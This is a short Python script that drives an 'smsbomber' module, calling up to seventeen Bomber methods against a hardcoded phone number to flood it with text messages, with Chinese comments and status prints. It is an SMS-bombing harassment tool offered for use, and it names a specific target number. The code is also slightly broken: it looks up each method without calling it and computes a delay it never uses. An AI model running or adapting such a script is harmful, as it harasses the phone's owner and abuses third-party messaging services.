from husini import smsbomber
import threading
import random
import time

def attack1(phone):
    func = ['func%d' %i for i in range(0,17)]
    for i in func:
        times = random.randint(5, 15)  #延迟发送
        if hasattr(smsbomber.Bomber, i):
            try:
                getattr(smsbomber.Bomber(phone), i)
                print('%s has excuted!' % i)

            except:
                print('%s meet some problems!' % i)
                continue
        else:
            print('There is not %s' % i)

if __name__=='__main__':
    attack1("13377224828")
    print("finished！")